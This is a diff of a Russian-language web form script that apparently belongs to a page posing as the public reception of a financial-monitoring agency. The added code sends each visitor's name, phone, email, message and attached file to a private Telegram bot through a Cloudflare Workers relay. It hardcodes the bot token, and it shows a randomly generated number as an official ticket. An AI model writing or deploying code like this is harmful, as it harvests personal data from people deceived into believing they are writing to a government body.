@@ -162,82 +162,82 @@
 
     <script>
         function sendForm(event) {
-            event.preventDefault();
-            
-            const form = event.target;
-            const button = form.querySelector('.btn-submit');
-            
-            button.innerText = "Отправка в Узел Связи...";
-            button.disabled = true;
+    event.preventDefault();
 
-            // === НАСТРОЙКИ ТЕЛЕГРАМА ===
-            const TELEGRAM_TOKEN = '8831492348:AAFs0KG_u8dxfPbTO1yboU-TrGJt0NJDvmk'; 
-            const TELEGRAM_CHAT_ID = '7386406575';
-            // ===========================
+    const form = event.target;
+    const button = form.querySelector('.btn-submit');
 
-            // Собираем текстовые данные из полей
-            const name = document.getElementById('fullName').value;
-            const email = document.getElementById('email').value;
-            const phone = document.getElementById('phone').value;
-            const subject = document.getElementById('subject').value;
-            const message = document.getElementById('message').value;
-            const fileInput = document.getElementById('file');
+    button.innerText = "Отправка в Узел Связи...";
+    button.disabled = true;
 
-            // Форматируем текст сообщения
-            const textMessage = `📩 *Новое обращение в приемную* \n\n` +
-                                `👤 *ФИО:* ${name}\n` +
-                                `📞 *Телефон:* ${phone}\n` +
-                                `📧 *Email:* ${email}\n` +
-                                `📁 *Тема:* ${subject}\n\n` +
-                                `📝 *Текст:* \n${message}`;
+    // === НАСТРОЙКИ ТЕЛЕГРАМА ===
+    const TELEGRAM_TOKEN = '8031492348:AAFsOKG_u8dxFPbTo1ybou-TrG3t0NJDvmk';
+    const TELEGRAM_CHAT_ID = '7386406575';
+    // ===========================
 
-            // 1. Сначала отправляем текстовую информацию
-            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    // Собираем текстовые данные из полей
+    const name = document.getElementById('fullName').value;
+    const email = document.getElementById('email').value;
+    const phone = document.getElementById('phone').value;
+    const subject = document.getElementById('subject').value;
+    const message = document.getElementById('message').value;
+    const fileInput = document.getElementById('file');
+
+    // Форматируем текст сообщения
+    const textMessage = `📩 *Новое обращение в приемную* \n\n` +
+        `👤 *ФИО:* ${name}\n` +
+        `📞 *Телефон:* ${phone}\n` +
+        `📧 *Email:* ${email}\n` +
+        `📑 *Тема:* ${subject}\n\n` +
+        `📝 *Текст:* \n${message}`;
+
+    // 1. Сначала отправляем текстовую информацию через Cloudflare цепочку
+    fetch(`https://damp-mountain-c71b.minin-rosfinmonitoring.workers.dev/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: textMessage,
+            parse_mode: 'Markdown'
+        })
+    })
+    .then(response => {
+        if (!response.ok) throw new Error('Ошибка отправки текста');
+
+        // 2. Если пользователь прикрепил файл – отправляем его следом через ту же цепочку
+        if (fileInput.files.length > 0) {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('document', fileInput.files[0]);
+            formData.append('caption', `📂 Файл к обращению от: ${name}`);
+
+            return fetch(`https://damp-mountain-c71b.minin-rosfinmonitoring.workers.dev/bot${TELEGRAM_TOKEN}/sendDocument`, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: textMessage,
-                    parse_mode: 'Markdown'
-                })
-            })
-            .then(response => {
-                if (!response.ok) throw new Error('Ошибка отправки текста');
-                
-                // 2. Если пользователь прикрепил файл — отправляем его следом
-                if (fileInput.files.length > 0) {
-                    const formData = new FormData();
-                    formData.append('chat_id', TELEGRAM_CHAT_ID);
-                    formData.append('document', fileInput.files[0]); 
-                    formData.append('caption', `📁 Файл к обращению от: ${name}`);
-
-                    return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                }
-                return response;
-            })
-            .then(res => {
-                if (res.ok) {
-                    // Генерируем номер РФМ-ОБ и показываем модалку успеха
-                    const randomTicket = Math.floor(100000 + Math.random() * 900000);
-                    document.getElementById('ticketNumber').innerText = randomTicket;
-                    document.getElementById('successModal').style.display = 'flex';
-                    form.reset(); // Очищаем поля формы
-                } else {
-                    alert("Текст ушел, но возникла ошибка при передаче файла в Telegram.");
-                }
-            })
-            .catch(error => {
-                console.error(error);
-                alert("Ошибка сервера при отправке. Убедитесь, что бот запущен и ключи указаны верно.");
-            })
-            .finally(() => {
-                button.innerText = "Отправить официальное обращение";
-                button.disabled = false;
+                body: formData
             });
         }
+        return response;
+    })
+    .then(res => {
+        if (res.ok) {
+            // Генерируем номер РФМ-ОБ и показываем модалку успеха
+            const randomTicket = Math.floor(100000 + Math.random() * 900000);
+            document.getElementById('ticketNumber').innerText = randomTicket;
+            document.getElementById('successModal').style.display = 'flex';
+            form.reset(); // Очищаем поля формы
+        } else {
+            alert("Текст ушел, но возникла ошибка при передаче файла в Telegram.");
+        }
+    })
+    .catch(error => {
+        console.error(error);
+        alert("Ошибка сервера при отправке. Убедитесь, что бот запущен и ключи указаны верно.");
+    })
+    .finally(() => {
+        button.innerText = "Отправить официальное обращение";
+        button.disabled = false;
+    });
+}
     </script>
 </body>
 </html>
